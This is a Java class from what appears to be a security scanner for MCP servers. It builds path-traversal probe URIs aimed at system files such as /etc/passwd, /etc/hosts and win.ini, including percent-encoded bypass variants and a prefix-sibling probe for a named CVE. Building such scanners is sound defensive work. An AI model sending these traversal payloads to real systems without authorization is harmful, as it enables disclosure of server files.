package com.mcpscanner.checks;

import com.mcpscanner.scan.UriTemplateExpansion;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Set;

public final class ResourceTraversalPayloads {

    public record TraversalPayload(String label, String uri, PathTraversalTier tier,
                                   String differentialKey, Set<FileSignature> expectedSignatures) {}

    /**
     * The two resources/read URIs the CVE-2025-53110 error-differential oracle reads: a NON-EXISTENT
     * sibling sharing the root prefix and a DENY-CONTROL that is clearly out-of-root and shares no
     * prefix. No planted secret — the oracle keys on not-found-vs-denied (see
     * {@link FilesystemErrorOracle#prefixSiblingConfirmed}).
     */
    public record PrefixSiblingProbe(String siblingUri, String denyControlUri) {}

    private static final String PASSWD_TARGET = "etc/passwd";
    private static final String WIN_INI_TARGET = "windows/win.ini";
    // The literal-slash escape prefixes (a small principled {deep, shallow} set) and the encoded twins
    // live in TraversalEscapes — see there for the clamp principle and the raw-prefilter rationale.
    private static final String SIBLING_MARKER = "_mcpscan";
    private static final String DENY_CONTROL_SEGMENT = "mcpscan-nonexistent";
    private static final String EMPTY_AUTHORITY_PREFIX = ":///";

    private static final List<TraversalPayload> FIXED_PAYLOADS = List.of(
            absolute("passwd-raw", "file:///etc/passwd", FileSignature.PASSWD),
            absolute("hosts-raw", "file:///etc/hosts", FileSignature.HOSTS),
            absolute("win-ini-raw", "file:///c:/windows/win.ini", FileSignature.WIN_INI),
            absolute("passwd-pct-slash", "file:///etc%2Fpasswd", FileSignature.PASSWD),
            absolute("hosts-pct-slash", "file:///etc%2Fhosts", FileSignature.HOSTS),
            absolute("win-ini-pct-path", "file:///c%3A%2Fwindows%2Fwin.ini", FileSignature.WIN_INI)
    );

    private ResourceTraversalPayloads() {}

    public static List<TraversalPayload> fixed() {
        List<TraversalPayload> payloads = new ArrayList<>(FIXED_PAYLOADS);
        payloads.addAll(differentialFamily("file:///", PASSWD_TARGET, FileSignature.PASSWD));
        payloads.addAll(differentialFamily("file:///", WIN_INI_TARGET, FileSignature.WIN_INI));
        return List.copyOf(payloads);
    }

    public static List<TraversalPayload> fromTemplates(List<String> uriTemplates) {
        List<TraversalPayload> payloads = new ArrayList<>();
        for (String template : uriTemplates) {
            String prefix = expandedPrefix(template);
            if (prefix == null) {
                continue;
            }
            payloads.addAll(differentialFamily(prefix, PASSWD_TARGET, FileSignature.PASSWD));
            payloads.addAll(differentialFamily(prefix, WIN_INI_TARGET, FileSignature.WIN_INI));
        }
        return payloads;
    }

    /**
     * Derives content-disclosure escape families from each discovered STATIC resource URI, emitting
     * payloads from BOTH plausible filesystem bases so the one check covers two distinct server
     * shapes:
     * <ul>
     *   <li><b>stripped-parent base</b> — for a server that lists a FILE inside its root
     *       ({@code file:///root/readme.txt} → base {@code file:///root/}); the escape drops the
     *       final segment, the historical behaviour.</li>
     *   <li><b>verbatim base</b> — for a server that lists the ROOT DIRECTORY itself
     *       ({@code file:///app/.../.obsidian-vault}); the discovered URI is treated verbatim as the
     *       base directory, so an escape RETAINS the full discovered root as a string prefix. This is
     *       the class a naive un-normalized {@code startsWith(full-root)} guard (DiggAI obsidian-mcp)
     *       lets through — the stripped-parent base would drop the last segment and fail that guard.</li>
     * </ul>
     * Payloads are deduped by URI so the two bases (which never collide for a depth-≥2 URI but could
     * for pathological inputs) never emit a redundant probe. Every emitted payload still only yields a
     * finding via the corroborated {@link FileSignature} oracle, so a sandboxed server fires nothing.
     */
    public static List<TraversalPayload> fromStaticUris(List<String> resourceUris) {
        LinkedHashMap<String, TraversalPayload> byUri = new LinkedHashMap<>();
        for (String resourceUri : resourceUris) {
            for (String base : staticEscapeBases(resourceUri)) {
                for (TraversalPayload payload : differentialFamily(base, PASSWD_TARGET, FileSignature.PASSWD)) {
                    byUri.putIfAbsent(payload.uri(), payload);
                }
            }
        }
        return new ArrayList<>(byUri.values());
    }

    /** The filesystem base directories to root escapes at for a discovered static URI. Always
     *  includes the VERBATIM base (the discovered URI treated as a directory root — covers a server
     *  that lists the root directory itself, including a single-segment {@code scheme:///<segment>}
     *  root that has no parent to strip) and, when the URI has a parent directory, the stripped-parent
     *  base (a file inside the root). Returns an empty list only when the URI has no derivable
     *  filesystem root shape at all (no FP for non-file resources such as {@code docs://readme}). */
    private static List<String> staticEscapeBases(String resourceUri) {
        if (!hasFilesystemRootShape(resourceUri)) {
            return List.of();
        }
        String strippedParent = fileBaseDirectory(resourceUri);
        String verbatim = verbatimBaseDirectory(resourceUri);
        if (strippedParent == null) {
            return List.of(verbatim);
        }
        return List.of(strippedParent, verbatim);
    }

    /** True when the URI has the {@code scheme:///<at-least-one-segment>} empty-authority filesystem
     *  shape that gives a directory to escape from — a single-segment root qualifies (verbatim base);
     *  a schemeless or authority-bearing URI does not. */
    private static boolean hasFilesystemRootShape(String resourceUri) {
        if (resourceUri == null) {
            return false;
        }
        int authority = resourceUri.indexOf(EMPTY_AUTHORITY_PREFIX);
        if (authority < 0) {
            return false;
        }
        int pathStart = authority + EMPTY_AUTHORITY_PREFIX.length();
        return pathStart < resourceUri.length();
    }

    /**
     * Builds the CVE-2025-53110 prefix-sibling probe pair for a concrete file-rooted resource URI.
     * The sibling walks one level up out of the root then into a directory whose name shares the
     * root's prefix ({@code <root-basename>_mcpscan/<random>}); the deny-control walks up into a
     * clearly-unrelated, non-prefix-sharing directory. Slashes are percent-encoded so both survive
     * single-template-variable routing (e.g. FastMCP resource templates drop literal-slash URIs);
     * the handler decodes them before the filesystem check, so the escape is preserved.
     *
     * @return the probe pair, or {@code null} for a URI with no derivable filesystem root or a
     * degenerate root with no shareable prefix segment — the caller skips the tier (no FP).
     */
    public static PrefixSiblingProbe prefixSiblingProbe(String resourceUri) {
        String baseDir = fileBaseDirectory(resourceUri);
        if (baseDir == null) {
            return null;
        }
        String rootBasename = lastPathSegment(baseDir);
        if (rootBasename == null) {
            return null;
        }
        String scheme = baseDir.substring(0, baseDir.indexOf("///") + "///".length());
        String random = Integer.toHexString(java.util.concurrent.ThreadLocalRandom.current().nextInt());
        String siblingUri = scheme + "..%2f" + rootBasename + SIBLING_MARKER + "_" + random
                + "%2f" + random;
        String denyControlUri = scheme + "..%2f" + DENY_CONTROL_SEGMENT + "-" + random + "%2f" + random;
        return new PrefixSiblingProbe(siblingUri, denyControlUri);
    }

    private static TraversalPayload absolute(String label, String uri, FileSignature signature) {
        return new TraversalPayload(label, uri, PathTraversalTier.ABSOLUTE,
                "absolute:" + uri, Set.of(signature));
    }

    private static List<TraversalPayload> differentialFamily(String base, String target,
                                                             FileSignature signature) {
        String key = base + "|" + target;
        List<TraversalPayload> family = new ArrayList<>();
        for (String literalPrefix : TraversalEscapes.LITERAL_PREFIXES) {
            family.add(new TraversalPayload("plain-traversal " + literalPrefix.length() + " " + key,
                    base + literalPrefix + target, PathTraversalTier.TRAVERSAL, key, Set.of(signature)));
        }
        for (TraversalEscapes.EncodedTwin twin : TraversalEscapes.ENCODED_TWINS) {
            family.add(new TraversalPayload(twin.label() + " " + key,
                    base + twin.escape() + TraversalEscapes.encodeTarget(target, twin.targetEncoding()),
                    PathTraversalTier.ENCODING_BYPASS, key, Set.of(signature)));
        }
        return family;
    }

    private static String lastPathSegment(String base) {
        String trimmed = stripTrailingSlash(base);
        int lastSlash = trimmed.lastIndexOf('/');
        if (lastSlash < 0 || lastSlash + 1 >= trimmed.length()) {
            return null;
        }
        return trimmed.substring(lastSlash + 1);
    }

    private static String expandedPrefix(String template) {
        if (template == null || template.indexOf('{') < 0) {
            return null;
        }
        UriTemplateExpansion.Result expansion = UriTemplateExpansion.expand(template);
        if (expansion.variables().size() != 1) {
            return null;
        }
        int firstVariableByte = expansion.variables().get(0).startInclusive();
        String expanded = expansion.expandedUri();
        // Scheme-agnostic: real-world file servers and the test-server fixtures expose
        // single-{var} templates on custom schemes (rooted:///, encoded:///, ...), not
        // just file://. Restricting injection to file:// would cause false negatives on
        // exactly those servers. The corroborated FileSignature oracle keeps this FP-safe:
        // a benign server that returns non-signature content for the injected escape never
        // fires. fromStaticUris stays file://-bound because it needs a real filesystem path
        // to derive a root.
        return new String(expanded.getBytes(StandardCharsets.UTF_8),
                0, firstVariableByte, StandardCharsets.UTF_8);
    }

    private static String fileBaseDirectory(String resourceUri) {
        // Scheme-agnostic root derivation: a server may expose a concrete filesystem-rooted
        // resource on file:// OR a custom scheme (prefixmatch:///, rooted:///, ...). We require
        // a "scheme:///<path>/<segment>" shape — an empty authority and at least one path
        // segment with a parent directory — so there is a real root to escape from. A
        // schemeless or authority-bearing or depth-0 URI (docs://readme, file:///readme.txt)
        // yields nothing. The corroborated FileSignature oracle keeps this FP-safe.
        if (resourceUri == null) {
            return null;
        }
        int authority = resourceUri.indexOf(EMPTY_AUTHORITY_PREFIX);
        if (authority < 0) {
            return null;
        }
        int pathStart = authority + EMPTY_AUTHORITY_PREFIX.length();
        int lastSlash = resourceUri.lastIndexOf('/');
        if (lastSlash < pathStart) {
            return null;
        }
        return resourceUri.substring(0, lastSlash + 1);
    }

    /** The discovered URI treated VERBATIM as a base directory (full root retained, trailing slash
     *  added), for servers that list the root directory itself. Only invoked once
     *  {@link #fileBaseDirectory} has confirmed a derivable filesystem root, so the shape is sound. */
    private static String verbatimBaseDirectory(String resourceUri) {
        return resourceUri.endsWith("/") ? resourceUri : resourceUri + "/";
    }

    private static String stripTrailingSlash(String value) {
        return value.endsWith("/") ? value.substring(0, value.length() - 1) : value;
    }
}
